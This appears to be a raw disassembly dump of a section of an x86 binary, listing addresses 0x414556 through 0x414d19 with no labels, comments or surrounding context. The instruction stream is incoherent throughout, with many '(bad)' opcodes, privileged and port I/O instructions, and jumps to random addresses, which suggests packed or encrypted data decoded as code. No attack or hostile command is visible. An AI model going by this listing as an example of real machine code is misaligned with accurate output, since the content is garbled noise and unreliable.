  414556:	rcl    BYTE PTR [esi+0x6410037b],1
  41455c:	jmp    0x41451c
  41455e:	enter  0x581e,0x81
  414562:	mov    DWORD PTR [ebp-0x629a64dd],ebp
  414568:	or     DWORD PTR [ebx-0x638d268a],edi
  41456e:	fucomi st,st(6)
  414570:	or     eax,0x929c0f7d
  414575:	aas    
  414576:	stos   DWORD PTR es:[edi],eax
  414577:	retf   
  414578:	ret    
  414579:	add    al,0x2e
  41457b:	iret   
  41457c:	add    al,0x69
  41457e:	fs jne 0x4145a3
  414581:	sar    dl,1
  414583:	add    esi,edi
  414585:	lods   al,BYTE PTR ds:[esi]
  414586:	ficomp DWORD PTR [ebp+0x6d]
  414589:	push   esp
  41458a:	imul   eax,DWORD PTR [edx],0x6b3bfb5
  414590:	push   ss
  414591:	leave  
  414592:	xlat   BYTE PTR ds:[ebx]
  414593:	fwait
  414594:	and    BYTE PTR [edi+0x526a2c81],ch
  41459a:	int3   
  41459b:	xor    esp,ebx
  41459d:	dec    edi
  41459e:	(bad)  
  4145a0:	add    DWORD PTR [eax+0x39],esp
  4145a3:	sub    ebx,DWORD PTR [eax-0x4df5baff]
  4145a9:	add    dh,ch
  4145ab:	cmp    al,0xee
  4145ad:	call   DWORD PTR [ecx]
  4145af:	sbb    al,0x73
  4145b1:	push   ecx
  4145b2:	(bad)  
  4145b3:	leave  
  4145b4:	mov    bl,0x50
  4145b6:	nop
  4145b7:	xor    DWORD PTR [eax-0x51],esi
  4145ba:	shr    BYTE PTR [esi+0xc5468db],1
  4145c0:	sbb    eax,DWORD PTR [edi-0x25]
  4145c3:	gs cld 
  4145c5:	ins    DWORD PTR es:[edi],dx
  4145c6:	mov    gs,WORD PTR [eax]
  4145c8:	(bad)  
  4145c9:	jg     0x414642
  4145cb:	cmp    eax,0xf3bebb44
  4145d0:	inc    edx
  4145d1:	sub    eax,0x1342922f
  4145d6:	mov    esi,DWORD PTR [edi+0x10193142]
  4145dc:	aam    0xa8
  4145de:	neg    dh
  4145e0:	or     esi,DWORD PTR [esp+ebx*4]
  4145e3:	mov    BYTE PTR [edi-0x33],ah
  4145e6:	pop    ds
  4145e7:	daa    
  4145e8:	sbb    DWORD PTR ds:0x68076a72,ebp
  4145ee:	outs   dx,BYTE PTR ds:[esi]
  4145ef:	cmp    ah,dh
  4145f1:	out    0x1f,eax
  4145f3:	addr16 lahf 
  4145f5:	push   es
  4145f6:	jg     0x414632
  4145f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f9:	shl    edx,cl
  4145fb:	push   ecx
  4145fc:	xor    DWORD PTR [ecx+0x40e5368a],ebp
  414602:	mov    WORD PTR [eax-0xe1f576f],cs
  414608:	cs jl  0x4145e5
  41460b:	lahf   
  41460c:	push   ebp
  41460d:	in     al,dx
  41460e:	jb     0x414625
  414610:	ss add eax,0xf77650f
  414616:	hlt    
  414617:	shl    DWORD PTR [eax],cl
  414619:	adc    esp,DWORD PTR [edi-0x3c01bfe3]
  41461f:	mov    al,ds:0xb8f5e32c
  414624:	mov    esp,DWORD PTR [edx+edi*8-0x1]
  414628:	pop    ecx
  414629:	iret   
  41462a:	fwait
  41462b:	cmp    al,0x82
  41462d:	push   edi
  41462e:	mov    ch,0xc1
  414630:	data16 stc 
  414632:	jbe    0x414653
  414634:	jbe    0x41464a
  414636:	cdq    
  414637:	adc    ecx,DWORD PTR [esi-0x39c9ef6]
  41463d:	cwde   
  41463e:	push   ds
  41463f:	mov    ebp,0xc53d36f3
  414644:	out    0x50,al
  414646:	int3   
  414647:	mov    gs,WORD PTR [ebp-0x3f]
  41464a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41464b:	daa    
  41464c:	popf   
  41464d:	(bad)  
  41464e:	aas    
  41464f:	xchg   DWORD PTR [esi],esi
  414651:	or     DWORD PTR [ecx-0x73],ebx
  414654:	xor    al,0x25
  414656:	fst    DWORD PTR [esi+ebp*1+0x1a13bf21]
  41465d:	aad    0xc6
  41465f:	push   ds
  414660:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414661:	mov    al,0x4f
  414663:	(bad)  
  414664:	(bad)  
  414665:	mov    edx,0xc2eae290
  41466a:	sbb    eax,0x607ed3c9
  41466f:	addr16 cmp al,0x3a
  414672:	sbb    dh,BYTE PTR [edi+0x5fc2f911]
  414678:	pop    edx
  414679:	sahf   
  41467a:	clc    
  41467b:	sahf   
  41467c:	cmp    eax,0x3edf56a6
  414681:	hlt    
  414682:	pop    ds
  414683:	push   cs
  414684:	dec    eax
  414685:	mov    dh,0x2a
  414687:	push   0x30771e4b
  41468c:	pop    eax
  41468d:	mov    bh,0x15
  41468f:	and    BYTE PTR [edx],bl
  414691:	inc    edi
  414692:	in     al,0x80
  414694:	mov    ah,0xb6
  414696:	mov    cl,0xf3
  414698:	inc    ebp
  414699:	jg     0x414644
  41469b:	mov    ch,0x2a
  41469d:	(bad)  
  41469f:	mov    ecx,0xec207687
  4146a4:	pop    ebp
  4146a5:	fwait
  4146a6:	lock mov ds:0x2fe074f0,al
  4146ac:	mov    bl,bh
  4146ae:	or     dh,BYTE PTR [eax-0x54]
  4146b1:	mov    esp,0x6dda8a90
  4146b6:	(bad)  
  4146b7:	pop    eax
  4146b8:	sti    
  4146b9:	retf   
  4146ba:	sub    DWORD PTR [eax+eax*4-0x126d169],ecx
  4146c1:	adc    ah,BYTE PTR [esi-0x46]
  4146c4:	cli    
  4146c5:	iret   
  4146c6:	and    al,0xaa
  4146c8:	xchg   edx,eax
  4146c9:	(bad)  
  4146cb:	mov    ds:0xb68fae0,eax
  4146d0:	dec    edx
  4146d1:	out    dx,eax
  4146d2:	loop   0x414682
  4146d4:	mov    eax,0xe489394
  4146d9:	test   bh,bh
  4146db:	lods   eax,DWORD PTR ds:[esi]
  4146dc:	fld    QWORD PTR [esi+0x78]
  4146df:	xchg   edi,eax
  4146e0:	sub    ebp,DWORD PTR [edi+0x581a7f76]
  4146e6:	popa   
  4146e7:	fsubr  st,st(2)
  4146e9:	stc    
  4146ea:	inc    esi
  4146eb:	dec    eax
  4146ec:	push   cs
  4146ed:	xor    edx,ebp
  4146ef:	repnz data16 (bad) 
  4146f2:	jae    0x414694
  4146f4:	mov    cl,0xee
  4146f6:	pop    esi
  4146f7:	in     eax,dx
  4146f8:	pshufw mm3,QWORD PTR [edx-0x5c9224],0xbc
  414700:	sub    DWORD PTR [edx-0x2c896ca6],esi
  414706:	iret   
  414707:	ret    0x6979
  41470a:	lods   al,BYTE PTR ds:[esi]
  41470b:	sub    ebx,DWORD PTR [ebp-0x67]
  41470e:	adc    eax,DWORD PTR [ecx-0x5a]
  414711:	inc    ebp
  414712:	xor    BYTE PTR [eax-0x14],0x11
  414716:	pop    ecx
  414717:	(bad)  
  414718:	mov    eax,0xedc9d962
  41471d:	sti    
  41471e:	push   cs
  41471f:	dec    ebp
  414720:	jbe    0x41474a
  414722:	mov    eax,0x2ce414b
  414727:	aad    0x87
  414729:	inc    edi
  41472a:	pop    edx
  41472b:	std    
  41472c:	add    dl,ah
  41472e:	fld    TBYTE PTR [ecx]
  414730:	inc    edx
  414731:	xchg   esi,eax
  414732:	jmp    0xb08c9981
  414737:	xor    BYTE PTR [ecx-0x279bb474],bh
  41473d:	out    dx,eax
  41473e:	iret   
  41473f:	cld    
  414740:	inc    eax
  414741:	icebp  
  414742:	ror    BYTE PTR [ecx+esi*1+0x75ffaa03],cl
  414749:	in     eax,0x31
  41474b:	inc    edi
  41474c:	inc    eax
  41474d:	test   BYTE PTR [eax],0x1c
  414750:	sar    esp,1
  414752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414753:	cmp    eax,0x47d7f931
  414758:	mov    edi,DWORD PTR ds:0x78f9efd9
  41475e:	daa    
  41475f:	add    DWORD PTR [esi-0x1d523ef2],0xffffffb1
  414766:	enter  0x6385,0x62
  41476a:	add    al,0xce
  41476c:	fstp   TBYTE PTR [ebx]
  41476e:	repz das 
  414770:	and    bl,BYTE PTR [ebp-0x4184a8cd]
  414776:	adc    BYTE PTR [eax],0xb5
  414779:	cmp    DWORD PTR [ebx+esi*2-0x7c],esp
  41477d:	push   ebp
  41477e:	xchg   edi,eax
  41477f:	sub    DWORD PTR [edi],edx
  414781:	push   ds
  414782:	mov    ch,0x42
  414784:	cmp    bl,BYTE PTR [edx+0x4fdcb5f4]
  41478a:	sub    ebx,DWORD PTR [edx-0x41]
  41478d:	jle    0x4147e3
  41478f:	ror    DWORD PTR es:[ebp+0x47],1
  414793:	sbb    DWORD PTR [ebx-0x1218bf51],ecx
  414799:	sbb    DWORD PTR [esi-0x6f],0xffffffb1
  41479d:	jns    0x41477d
  41479f:	mov    al,0x20
  4147a1:	xchg   esp,eax
  4147a2:	jno    0x414803
  4147a4:	fimul  WORD PTR [eax]
  4147a6:	dec    esi
  4147a7:	mov    ebx,0x62c106fd
  4147ac:	sub    dl,BYTE PTR [ebp-0x78774eec]
  4147b2:	call   0x83740fc9
  4147b7:	push   es
  4147b8:	xchg   edi,eax
  4147b9:	sub    eax,0x58cef0a9
  4147be:	add    DWORD PTR [eax-0x31],esi
  4147c1:	sub    edi,edx
  4147c3:	mov    edi,0x25332402
  4147c8:	mov    ds:0x6feb6a69,eax
  4147cd:	gs call 0x96b740aa
  4147d3:	in     al,0x7f
  4147d5:	or     al,0x5d
  4147d7:	jmp    0x41484d
  4147d9:	dec    esi
  4147da:	(bad)
  4147de:	adc    al,cl
  4147e0:	(bad)  
  4147e1:	xchg   esi,eax
  4147e2:	cmovae esi,ebx
  4147e5:	push   ss
  4147e6:	ja     0x4147cc
  4147e8:	mov    esi,DWORD PTR [ebx+0x32a9e296]
  4147ee:	pop    ds
  4147ef:	dec    edx
  4147f0:	xchg   DWORD PTR [ecx+0x30],ebp
  4147f3:	sub    eax,0x51d3774f
  4147f8:	test   BYTE PTR [ecx],ch
  4147fa:	mov    eax,0xd30c78ee
  4147ff:	xchg   BYTE PTR [eax],cl
  414801:	push   edx
  414802:	mov    eax,ds:0x5b6a92db
  414807:	cwde   
  414808:	push   esi
  414809:	add    BYTE PTR [ecx-0x1],bh
  41480c:	int    0xf8
  41480e:	mov    BYTE PTR [eax-0x232d06fc],bh
  414814:	xchg   esp,eax
  414815:	jge    0x4147e6
  414817:	xor    eax,0x24607b54
  41481c:	xchg   BYTE PTR [ecx],bh
  41481e:	lods   al,BYTE PTR ds:[esi]
  41481f:	std    
  414820:	mov    ah,0x68
  414822:	add    dh,al
  414824:	add    ch,BYTE PTR [ecx+0x16e9fcca]
  41482a:	retf   
  41482b:	popa   
  41482c:	in     eax,0x4a
  41482e:	sahf   
  41482f:	and    DWORD PTR [ecx],0x33
  414832:	add    dl,BYTE PTR [ebp+0x56]
  414835:	xor    edi,DWORD PTR [ebp+0x26]
  414838:	mov    DWORD PTR [ebx-0x6c],ecx
  41483b:	jnp    0x4148b1
  41483d:	push   ebx
  41483e:	hlt    
  41483f:	inc    ecx
  414840:	inc    esi
  414841:	retf   
  414842:	sbb    ecx,esp
  414844:	outs   dx,BYTE PTR ds:[esi]
  414845:	jno    0x414889
  414847:	pop    esi
  414848:	sub    bl,BYTE PTR [edx-0x4d]
  41484b:	pop    ebx
  41484c:	add    esi,DWORD PTR gs:[edx-0x60]
  414850:	add    eax,0xaea3c985
  414855:	sub    eax,0xc2091110
  41485a:	push   eax
  41485b:	pusha  
  41485c:	adc    cl,dh
  41485e:	in     eax,0x70
  414860:	push   ebp
  414861:	(bad)  
  414862:	adc    eax,0xbc1ab6fe
  414867:	add    edx,esp
  414869:	shl    DWORD PTR [esi],1
  41486b:	aas    
  41486c:	lock fdivp st(7),st
  41486f:	std    
  414870:	icebp  
  414871:	push   esi
  414872:	lods   al,BYTE PTR ds:[esi]
  414873:	(bad)  
  414875:	test   BYTE PTR [ebx+0x52],bl
  414878:	adc    ecx,edx
  41487a:	fmul   st(4),st
  41487c:	cli    
  41487d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41487e:	out    0xf7,al
  414880:	(bad)  
  414881:	les    ebx,FWORD PTR [ebx+0x78f89232]
  414887:	imul   ebx,DWORD PTR [ebx-0x533bd534],0xd7569e56
  414891:	push   es
  414892:	jno    0x4148c2
  414894:	sub    bh,BYTE PTR [esi+ecx*2+0x344e74f4]
  41489b:	clc    
  41489c:	xor    eax,0xc8803271
  4148a1:	into   
  4148a2:	push   es
  4148a3:	jae    0x414893
  4148a5:	jl     0x4148ba
  4148a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148a8:	or     al,0xcc
  4148aa:	rol    BYTE PTR [ebp-0x1c],1
  4148ad:	cmp    eax,0x464eefff
  4148b2:	shl    DWORD PTR [esi+0x3d],1
  4148b5:	mov    al,ds:0x7efbf009
  4148ba:	mov    edi,0xc441d8e0
  4148bf:	push   0xe39efbbe
  4148c4:	pop    ecx
  4148c5:	xchg   edi,eax
  4148c6:	sub    esp,DWORD PTR [ebx]
  4148c8:	out    0xb9,eax
  4148ca:	dec    eax
  4148cb:	xor    al,0xc5
  4148cd:	mov    bl,0x7
  4148cf:	dec    ebp
  4148d0:	in     eax,dx
  4148d1:	or     al,0x3a
  4148d3:	shr    DWORD PTR ds:0xe0ddce3e,0x80
  4148da:	(bad)  
  4148db:	mov    edi,0x2c7e3aee
  4148e0:	aaa    
  4148e1:	adc    dh,BYTE PTR [eax]
  4148e3:	push   es
  4148e4:	inc    esi
  4148e5:	add    eax,0x1e30b217
  4148ea:	gs gs cld 
  4148ed:	lock jmp 0x4148b4
  4148f0:	xlat   BYTE PTR ds:[ebx]
  4148f1:	jnp    0x41492d
  4148f3:	sti    
  4148f4:	fild   QWORD PTR ds:0x5cfafd95
  4148fa:	mov    esi,0xe72a7e1
  4148ff:	jns    0x4148dc
  414901:	or     edx,eax
  414903:	out    dx,eax
  414904:	lock mov ds:0x98f613a0,al
  41490a:	out    dx,al
  41490b:	outs   dx,DWORD PTR ds:[esi]
  41490c:	sub    eax,0x8edff113
  414911:	mov    esi,0xa4cf2c70
  414916:	fnstcw WORD PTR [ecx-0xb]
  414919:	inc    edx
  41491a:	dec    esi
  41491b:	adc    ah,BYTE PTR [ebx+0x2d]
  41491e:	sub    DWORD PTR [edi+0xd2683dd],esp
  414924:	repnz sahf 
  414926:	jmp    DWORD PTR [ebx+0xd]
  414929:	in     eax,dx
  41492a:	sar    BYTE PTR [eax],0xb3
  41492d:	xchg   DWORD PTR [ebp-0x77],edx
  414930:	retf   
  414931:	fcomp  QWORD PTR [eax-0x16478cfa]
  414937:	stos   BYTE PTR es:[edi],al
  414938:	or     DWORD PTR [ebx+0x40],esi
  41493b:	sbb    esp,esi
  41493d:	push   edx
  41493e:	aad    0x36
  414940:	add    eax,ebx
  414942:	clc    
  414943:	cmp    bl,BYTE PTR [ebp+0x7f]
  414946:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414947:	in     eax,dx
  414948:	bound  ecx,QWORD PTR [ebx+eax*2+0x3d]
  41494c:	aad    0xc0
  41494e:	enter  0x8378,0x35
  414952:	adc    eax,DWORD PTR [eax+0x66194c2d]
  414958:	mov    ch,0xd
  41495a:	out    dx,eax
  41495b:	sbb    DWORD PTR [eax],ebx
  41495d:	out    0xb,eax
  41495f:	cld    
  414960:	cdq    
  414961:	scas   eax,DWORD PTR es:[edi]
  414962:	shl    BYTE PTR [ebp-0x2],cl
  414965:	xchg   ecx,eax
  414966:	dec    eax
  414967:	pop    ss
  414968:	push   edx
  414969:	lods   eax,DWORD PTR ds:[esi]
  41496a:	mov    edx,0x8aa04ae0
  41496f:	inc    edx
  414970:	jne    0x414979
  414972:	dec    ebx
  414973:	adc    cl,dl
  414975:	push   cs
  414976:	mov    ah,0x9d
  414978:	test   DWORD PTR [ebx+eiz*2],esi
  41497b:	scas   al,BYTE PTR es:[edi]
  41497c:	or     edi,eax
  41497e:	mov    al,0x8a
  414980:	inc    edi
  414981:	mov    edx,0x96bf38a9
  414986:	xor    eax,0x2e7c47c4
  41498b:	dec    ecx
  41498c:	and    eax,0xbe2f66c0
  414991:	mov    BYTE PTR [edi+0x4da2120d],bh
  414997:	add    dl,BYTE PTR [esi-0x5b6bb1d]
  41499d:	push   0xffffff85
  41499f:	mov    cl,0x4f
  4149a1:	clc    
  4149a2:	lods   eax,DWORD PTR ds:[esi]
  4149a3:	(bad)  [ebp+0x1f9709e7]
  4149a9:	sbb    cl,0x38
  4149ac:	(bad)  
  4149ad:	jge    0x414958
  4149af:	popf   
  4149b0:	mov    dh,0x19
  4149b2:	adc    al,0xd5
  4149b4:	mov    dl,0xa0
  4149b6:	jae    0x4149d7
  4149b8:	or     bh,BYTE PTR cs:[edi-0x2d]
  4149bc:	lock xlat BYTE PTR ds:[ebx]
  4149be:	push   ecx
  4149bf:	adc    eax,0x9f3d1574
  4149c4:	mov    edi,0x57c3d906
  4149c9:	cmp    BYTE PTR [ecx],bh
  4149cb:	xor    dl,BYTE PTR [ebx+0x26606cb4]
  4149d1:	jb     0x414a1a
  4149d3:	retf   
  4149d4:	or     BYTE PTR [esi-0x4d6a4de4],al
  4149da:	or     eax,0xbb955a80
  4149df:	pop    ebp
  4149e0:	sub    BYTE PTR [ecx+0x2b290769],ch
  4149e6:	push   ss
  4149e7:	(bad)  
  4149e8:	sbb    al,0x9a
  4149ea:	push   eax
  4149eb:	sbb    eax,0xf89c2121
  4149f0:	fimul  WORD PTR [ebx-0x3b]
  4149f3:	das    
  4149f4:	ret    
  4149f5:	out    dx,al
  4149f6:	jbe    0x414a75
  4149f8:	fdivr  DWORD PTR [edx+0x45]
  4149fb:	js     0x414a38
  4149fd:	pop    ebp
  4149fe:	cmp    esi,DWORD PTR [ebx+0x551bfb90]
  414a04:	sbb    al,0x17
  414a06:	fwait
  414a07:	test   eax,0x6ab6a6b4
  414a0c:	inc    edi
  414a0d:	mov    al,0xbd
  414a0f:	jmp    0x10a41228
  414a14:	in     al,0xdf
  414a16:	sub    DWORD PTR [ebx],esi
  414a18:	cmp    BYTE PTR [edi+0x1bbf38f0],dh
  414a1e:	hlt    
  414a1f:	and    eax,DWORD PTR [ebx+0x21]
  414a22:	div    BYTE PTR [esi+0x63cb02dc]
  414a28:	loope  0x4149e6
  414a2a:	(bad)  
  414a2c:	inc    edx
  414a2d:	fmul   QWORD PTR [ecx-0x11]
  414a30:	repnz fcmovb st,st(6)
  414a33:	xor    ch,BYTE PTR [esi+0x55]
  414a36:	sbb    BYTE PTR [esi+0x6e21c4e1],dh
  414a3c:	dec    eax
  414a3d:	cmp    DWORD PTR [esi+0x65825b4d],edi
  414a43:	sub    esi,DWORD PTR [edi-0x58]
  414a46:	add    eax,0x509de250
  414a4b:	mov    ch,ch
  414a4d:	stos   DWORD PTR es:[edi],eax
  414a4e:	push   edi
  414a4f:	in     eax,0x44
  414a51:	fnstenv [esp+ebp*8-0x276dc29f]
  414a58:	sti    
  414a59:	int3   
  414a5a:	aaa    
  414a5b:	sbb    DWORD PTR [ebx],0x0
  414a5e:	mov    ebx,0xd5519825
  414a63:	jmp    0xf417:0xd353fc38
  414a6a:	sbb    DWORD PTR [eax],0xf523e565
  414a70:	sbb    ah,BYTE PTR [edx+0x145d0e8b]
  414a76:	inc    ebp
  414a77:	addr16 ss sti 
  414a7a:	pop    esi
  414a7b:	push   esi
  414a7c:	and    eax,0xbb1a2706
  414a81:	jno    0x414a1c
  414a83:	mov    ds:0xd6648afe,al
  414a88:	push   ecx
  414a89:	xchg   edx,eax
  414a8a:	cmp    esp,edx
  414a8c:	ror    BYTE PTR [esi-0x19dd61bd],1
  414a92:	mov    bl,BYTE PTR [edx-0x5def2d2a]
  414a98:	fwait
  414a99:	jmp    0x83b2:0x756ce16c
  414aa0:	rcl    BYTE PTR [edi-0xe],cl
  414aa3:	sub    BYTE PTR [eax],ch
  414aa5:	xor    BYTE PTR [ecx-0x7170d7f5],ah
  414aab:	xchg   esp,eax
  414aac:	xchg   ecx,eax
  414aad:	sub    dl,BYTE PTR [esi-0xb]
  414ab0:	sub    BYTE PTR [esi-0x56e677fd],ch
  414ab6:	sbb    edi,edx
  414ab8:	mov    ebx,0xf51fd7ed
  414abd:	pop    ebx
  414abe:	cs test al,0x1e
  414ac1:	lock adc bh,al
  414ac4:	fimul  DWORD PTR [edi]
  414ac6:	mov    dl,BYTE PTR [eax-0x1c]
  414ac9:	mov    WORD PTR [ebx-0x52b46ec],ds
  414acf:	in     al,0xd6
  414ad1:	das    
  414ad2:	nop
  414ad3:	adc    ebx,esi
  414ad5:	inc    ebx
  414ad6:	sahf   
  414ad7:	sbb    al,0xb2
  414ad9:	mov    edi,0x513712ff
  414ade:	jne    0x414b39
  414ae0:	mov    al,0xac
  414ae2:	iret   
  414ae3:	scas   eax,DWORD PTR es:[edi]
  414ae4:	pop    ebx
  414ae5:	ss addr16 jg 0x414b5f
  414ae9:	fwait
  414aea:	das    
  414aeb:	outs   dx,BYTE PTR ds:[esi]
  414aec:	(bad)  
  414aed:	mov    ebp,0x52f8463
  414af2:	jns    0x414b52
  414af4:	push   ds
  414af5:	aam    0xf6
  414af7:	adc    DWORD PTR [esi-0x60],eax
  414afa:	sub    DWORD PTR [edx-0x6b79bea3],0xbb0ef51c
  414b04:	jae    0x36a164bb
  414b0a:	call   DWORD PTR [ebx+ebx*4+0x54]
  414b0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0f:	jae    0x414af6
  414b11:	cmp    bl,BYTE PTR [ebx]
  414b13:	dec    eax
  414b14:	jae    0x414b04
  414b16:	lock push ds
  414b18:	jnp    0x414b65
  414b1a:	lds    edi,FWORD PTR [edx]
  414b1c:	add    DWORD PTR [edi],edx
  414b1e:	(bad)  
  414b1f:	cli    
  414b20:	inc    ebp
  414b21:	das    
  414b22:	sub    BYTE PTR [edi+0x7bc36f5],dl
  414b28:	dec    edx
  414b29:	ja     0x414b26
  414b2b:	mov    ds:0x6031aaff,eax
  414b30:	data16 fwait
  414b32:	xchg   ebp,eax
  414b33:	add    esp,0x5886ab3a
  414b39:	aas    
  414b3a:	hlt    
  414b3b:	aam    0xb9
  414b3d:	outs   dx,BYTE PTR ds:[esi]
  414b3e:	inc    edi
  414b3f:	sbb    BYTE PTR [edx+0x41],bl
  414b42:	mov    ah,0xa1
  414b44:	or     al,0x92
  414b46:	adc    ebx,esi
  414b48:	jge    0x414bad
  414b4a:	and    eax,0xfc4b7a31
  414b4f:	push   ss
  414b50:	sbb    DWORD PTR [ecx-0x76],edi
  414b53:	ret    0x80f7
  414b56:	out    0x63,eax
  414b58:	out    0x51,al
  414b5a:	adc    al,0x5c
  414b5c:	xlat   BYTE PTR ds:[ebx]
  414b5d:	xor    edi,DWORD PTR [ecx+edi*4]
  414b60:	cmp    al,bh
  414b62:	sub    al,0x2c
  414b64:	push   esp
  414b65:	popa   
  414b66:	or     al,0x3
  414b68:	add    al,0xea
  414b6a:	popf   
  414b6b:	(bad)  
  414b6f:	sub    DWORD PTR [ebx-0x55],ebp
  414b72:	pop    esi
  414b73:	lds    ebp,FWORD PTR [esi+0x5b]
  414b76:	lods   eax,DWORD PTR ds:[esi]
  414b77:	add    BYTE PTR [ebx-0x18],al
  414b7a:	call   FWORD PTR [edx]
  414b7c:	das    
  414b7d:	into   
  414b7e:	pop    edi
  414b7f:	push   edi
  414b80:	jmp    0xdc3a88ac
  414b85:	or     al,0xfd
  414b87:	lods   eax,DWORD PTR ds:[esi]
  414b88:	repz leave 
  414b8a:	jns    0x414b77
  414b8c:	pop    ecx
  414b8d:	rcl    al,1
  414b8f:	lock pop ecx
  414b91:	sub    ebx,DWORD PTR [esi+0x765e93df]
  414b97:	je     0x414b4f
  414b99:	lahf   
  414b9a:	xor    edx,0xffffffdd
  414b9d:	into   
  414b9e:	pop    esp
  414b9f:	cwde   
  414ba0:	sbb    BYTE PTR [ebx+0x2190d43],0x59
  414ba7:	shl    DWORD PTR [esi+eiz*4+0x3bdae307],0x6e
  414baf:	jp     0x414b45
  414bb1:	jmp    0x130f235d
  414bb6:	mov    ah,0xae
  414bb8:	sbb    eax,0xdc737edf
  414bbd:	or     edi,eax
  414bbf:	call   DWORD PTR [edx+0x65]
  414bc2:	mov    ds:0xffbae827,eax
  414bc7:	daa    
  414bc8:	je     0x414b75
  414bca:	repnz shl DWORD PTR [edx*2+0x106a2d27],1
  414bd2:	jae    0x414b59
  414bd4:	out    0x8c,al
  414bd6:	jp     0x414c0d
  414bd8:	out    0x63,al
  414bda:	fimul  WORD PTR [ecx-0xd8d9fe2]
  414be0:	mov    BYTE PTR [ecx+edi*1-0x6e],bl
  414be4:	pop    ds
  414be5:	adc    al,0x69
  414be7:	sahf   
  414be8:	mov    al,0xda
  414bea:	pop    edi
  414beb:	fisttp QWORD PTR [edi-0x41eb2153]
  414bf1:	jmp    0x414bed
  414bf3:	mov    bl,0x36
  414bf5:	retf   0x86df
  414bf8:	bound  eax,QWORD PTR [esi-0x4c]
  414bfb:	adc    BYTE PTR [esi-0x6d],dl
  414bfe:	mov    DWORD PTR [eax+0x6c],ebx
  414c01:	jp     0x414be8
  414c03:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  414c05:	gs out 0x7a,al
  414c08:	push   ecx
  414c09:	or     eax,0x67e9e760
  414c0e:	(bad)  
  414c10:	cmp    ah,BYTE PTR [ebp-0x30065cf1]
  414c16:	jns    0x414bb3
  414c18:	cmp    BYTE PTR [ebp+0xe20e938],ch
  414c1e:	push   edx
  414c1f:	hlt    
  414c20:	mov    dh,0x75
  414c22:	iret   
  414c23:	adc    BYTE PTR [ebx+0x574729e2],0xa9
  414c2a:	into   
  414c2b:	fld    st(6)
  414c2d:	data16 sbb dl,cl
  414c30:	mov    dl,0x0
  414c32:	sahf   
  414c33:	and    eax,0x1ace7929
  414c38:	jl     0x414ca6
  414c3a:	jg     0x414cb4
  414c3c:	es (bad) 
  414c3f:	retf   0x2569
  414c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c43:	daa    
  414c44:	in     eax,dx
  414c45:	push   ecx
  414c46:	add    BYTE PTR [ebx+0x6e],cl
  414c49:	cmp    al,0xbd
  414c4b:	fiadd  WORD PTR [ecx]
  414c4d:	pop    ecx
  414c4e:	int3   
  414c4f:	push   ss
  414c50:	iret   
  414c51:	jmp    0x316191d6
  414c56:	lahf   
  414c57:	or     al,0x78
  414c59:	jle    0x414c59
  414c5b:	ds imul edx,DWORD PTR fs:[eax-0x44],0xfbc5351b
  414c64:	jge    0x414bf4
  414c66:	push   esi
  414c67:	xor    ebx,ebp
  414c69:	into   
  414c6a:	pop    edx
  414c6b:	jmp    0x414c1c
  414c6d:	cdq    
  414c6e:	stc    
  414c6f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  414c71:	mov    ebp,0xa57cfc65
  414c76:	pushf  
  414c77:	pop    edx
  414c78:	ins    BYTE PTR es:[edi],dx
  414c79:	pop    ebp
  414c7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c7b:	std    
  414c7c:	push   edx
  414c7d:	add    bh,cl
  414c7f:	jmp    0xce20a27e
  414c84:	ret    0x19c5
  414c87:	jmp    0x7677:0xafbf037d
  414c8e:	outs   dx,BYTE PTR ds:[esi]
  414c8f:	mov    eax,0x5330f3bd
  414c94:	adc    BYTE PTR [edi+ecx*4],dh
  414c97:	std    
  414c98:	inc    ecx
  414c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c9a:	add    eax,0xe2bc9182
  414c9f:	fs call 0xe2618ea3
  414ca5:	jl     0x414ccf
  414ca7:	pop    edi
  414ca8:	adc    BYTE PTR [esi],ah
  414caa:	dec    edi
  414cab:	test   BYTE PTR [edx+0x746c69f3],bl
  414cb1:	dec    esp
  414cb2:	xor    esi,DWORD PTR [ecx-0x1f]
  414cb5:	daa    
  414cb6:	outs   dx,DWORD PTR ds:[esi]
  414cb7:	adc    ah,al
  414cb9:	add    cl,BYTE PTR [eax]
  414cbb:	xor    ebx,ecx
  414cbd:	jno    0x414d0f
  414cbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414cc0:	and    DWORD PTR [edi+ecx*1-0x49ad1f8d],0xa9c14aac
  414ccb:	mov    dh,al
  414ccd:	stos   DWORD PTR es:[edi],eax
  414cce:	cmc    
  414ccf:	clc    
  414cd0:	dec    esp
  414cd1:	(bad)  
  414cd2:	fs fdiv st(3),st
  414cd5:	push   ebx
  414cd6:	jmp    0x2477e8a9
  414cdb:	and    al,0x98
  414cdd:	add    al,0xc6
  414cdf:	fcom   QWORD PTR [ebx+0x2f]
  414ce2:	adc    bl,BYTE PTR [eiz*8+0x1f54f74e]
  414ce9:	loopne 0x414ce4
  414ceb:	xchg   ebp,eax
  414cec:	ins    BYTE PTR es:[edi],dx
  414ced:	inc    ebx
  414cee:	ja     0x414d0c
  414cf0:	ret    
  414cf1:	dec    ebx
  414cf2:	pop    esp
  414cf3:	dec    ebp
  414cf4:	in     al,dx
  414cf5:	into   
  414cf6:	and    al,0xc1
  414cf8:	push   0x57
  414cfa:	loop   0x414d44
  414cfc:	jo     0x414cbc
  414cfe:	adc    al,0x86
  414d00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d01:	xor    eax,0x867025d9
  414d06:	aam    0x73
  414d08:	pop    edx
  414d09:	retf   
  414d0a:	sbb    DWORD PTR [ebx],ebp
  414d0c:	mov    DWORD PTR [eax-0x3a28dda9],esi
  414d12:	out    dx,al
  414d13:	push   edi
  414d14:	(bad)  
  414d15:	pop    DWORD PTR [edi+ecx*2]
  414d18:	retf   
  414d19:	xlat   BYTE PTR ds:[ebx]
